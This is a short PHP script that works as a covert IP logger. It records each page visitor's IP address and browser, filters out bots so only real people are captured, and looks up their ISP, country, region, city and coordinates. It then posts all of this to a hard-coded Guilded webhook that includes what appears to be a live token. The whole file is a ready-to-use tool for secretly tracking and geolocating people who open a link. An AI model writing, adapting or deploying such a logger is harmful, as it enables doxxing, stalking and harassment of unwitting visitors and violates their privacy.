<?php

//Get the IP & Info
$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

//Stop us from picking up bot ips
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

//Info
$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates

//Variables
$Webhook    = "https://media.guilded.gg/webhooks/e0fe39b4-4daa-4f07-9331-1e66d6876142/l3EETEAU5aUEYsc8kqMmcgCgqAIi8O6aiI0AY6Qi6keQuCuq68quayA4aoQyaQWewEmSw6UK0qQyyk20ESaakE"; //Webhook here.

$WebhookTag = "Goofy Ah"; //This will be the name of the webhook when it sends a message.  

//JS we are going to send to the webhook.
$JS = array(
    'username'   => "$WebhookTag" , 
    'avatar_url' => "https://media.discordapp.net/attachments/1040410496949563522/1040428301434490880/stsmall507x507-pad600x600f8f8f8.jpg",
    'content'    => "IP Info:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\nLocation: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
 
//Encode that JS so we can post it to the webhook
$JSON = json_encode($JS);


function IpToWebhook($Hook, $Content)
{
    //Use Curl to post to the webhook.
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook($Webhook, $JSON);
?>